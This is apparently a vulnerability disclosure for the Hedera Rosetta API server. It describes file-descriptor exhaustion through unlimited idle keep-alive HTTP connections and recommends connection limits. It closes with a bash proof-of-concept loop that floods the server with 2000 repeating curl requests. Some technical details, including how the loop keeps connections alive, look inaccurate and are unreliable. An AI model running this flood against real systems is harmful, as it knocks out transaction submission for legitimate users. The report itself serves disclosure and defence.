### Title
Unbounded Idle HTTP Connection Exhaustion (File Descriptor DoS) in Rosetta API Server

### Summary
The Rosetta API HTTP server (`rosetta/main.go`) constructs a `net/http` server with no total-connection limit — only timeout fields from `Http{}` in `rosetta/app/config/types.go` are set. An unprivileged attacker can open thousands of keep-alive connections, send one lightweight request per connection to reset the `IdleTimeout` timer every ~9 seconds, and accumulate idle connections until the process exhausts its OS file descriptor limit, preventing any new `/construction/submit` connections from being established and blocking transaction gossip.

### Finding Description
**Exact code path:**

`rosetta/app/config/types.go` lines 64–69 defines the `Http` struct with only timeout fields and no connection-count ceiling:
```go
type Http struct {
    IdleTimeout       time.Duration `yaml:"idleTimeout"`
    ReadTimeout       time.Duration `yaml:"readTimeout"`
    ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
    WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```

`rosetta/main.go` lines 220–227 constructs the `http.Server` using only those fields:
```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

There is no `netutil.LimitListener`, no `ConnState` hook, and no `http.Server.MaxConnsPerHost` equivalent. The grep across all rosetta code confirms zero occurrences of `LimitListener`, `ConnState`, or `MaxConns`.

**Default `IdleTimeout`:** `10000000000` ns = **10 seconds** (documented in `docs/configuration.md` line 662).

**Root cause:** Go's `net/http` server imposes no upper bound on the number of simultaneously open connections. `IdleTimeout` only closes a connection that has been completely idle for 10 s. An attacker who sends one cheap request (e.g., `POST /network/list`) every 9 seconds per connection resets the timer indefinitely, keeping each connection alive and consuming one file descriptor.

**Why the Traefik middleware is insufficient:**

`charts/hedera-mirror-rosetta/values.yaml` lines 152–156 configure:
```yaml
- inFlightReq:
    amount: 5
    sourceCriterion:
      ipStrategy:
        depth: 1
```
`inFlightReq` counts **active in-flight HTTP requests** — requests currently being processed by a handler. Once a request completes and the connection transitions to the HTTP keep-alive idle state, it is **no longer counted** by this middleware. The idle TCP socket persists and consumes a file descriptor on the Go server, entirely outside Traefik's visibility.

`charts/hedera-mirror-rosetta/values.yaml` lines 157–160:
```yaml
- rateLimit:
    average: 10
    sourceCriterion:
      requestHost: true
```
This rate limit is keyed on the HTTP `Host` header, not source IP. An attacker using varied `Host` values or multiple source IPs bypasses it trivially.

Additionally, in non-Kubernetes deployments (Docker, bare metal), port 5700 is directly exposed with no Traefik layer at all.

### Impact Explanation
When the Go process's file descriptor limit is exhausted (default `ulimit -n` is 1024 on many Linux systems; even with 65535, achievable with a modest botnet), `net.Listen` / `accept()` calls fail with `EMFILE`/`ENFILE`. All new TCP connections are refused, including legitimate `/construction/submit` calls. This directly blocks the gossip of transactions to the Hedera network — the primary security-critical function of the Rosetta construction endpoint. The server continues running but is completely unreachable for new clients. Severity: **High** (availability of transaction submission, no authentication bypass required).

### Likelihood Explanation
Preconditions: network access to port 5700 (or the Traefik ingress). No credentials, no special protocol knowledge. The attacker needs only the ability to open TCP connections and send minimal HTTP/1.1 requests. A single machine with ~1,000 source ports can exhaust a default fd limit. A small botnet (10–100 nodes) can exhaust even a raised limit of 65535. The attack is repeatable and persistent — as long as the attacker keeps sending keepalive requests every 9 seconds, the connections never expire. The `inFlightReq` limit of 5 per IP is irrelevant because idle connections are not in-flight.

### Recommendation
1. **Wrap the listener with a connection limit** before passing it to `httpServer.Serve()`:
   ```go
   import "golang.org/x/net/netutil"
   ln, _ := net.Listen("tcp", httpServer.Addr)
   ln = netutil.LimitListener(ln, 1000) // tune to expected concurrency
   httpServer.Serve(ln)
   ```
2. **Add a `ConnState` hook** to track and enforce per-IP connection counts, rejecting connections from IPs that exceed a threshold.
3. **Reduce `IdleTimeout`** to 2–3 seconds to shrink the window for accumulation.
4. **Add a `MaxConns` field** to the `Http` config struct and enforce it at server startup.
5. In Kubernetes, change the Traefik `inFlightReq` criterion to also count idle connections, or add a TCP-level connection limit at the load balancer.

### Proof of Concept
```bash
# Requires: bash, curl, GNU parallel or a simple loop
# Target: rosetta server at 192.0.2.1:5700

# Step 1: Open 2000 persistent keep-alive connections, each sending a
#         lightweight request every 9 seconds to reset IdleTimeout.
for i in $(seq 1 2000); do
  (while true; do
     curl -s -o /dev/null \
       --keepalive-time 9 \
       -H "Connection: keep-alive" \
       -H "Content-Type: application/json" \
       -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"}}' \
       http://192.0.2.1:5700/network/list
     sleep 8
   done) &
done

# Step 2: After ~30 seconds, attempt a legitimate /construction/submit
curl -v -X POST http://192.0.2.1:5700/construction/submit \
  -H "Content-Type: application/json" \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"},"signed_transaction":"..."}'

# Expected result: connection refused or timeout — server fd limit exhausted.
# Verify on server: ls /proc/$(pgrep rosetta)/fd | wc -l  → near ulimit -n value
```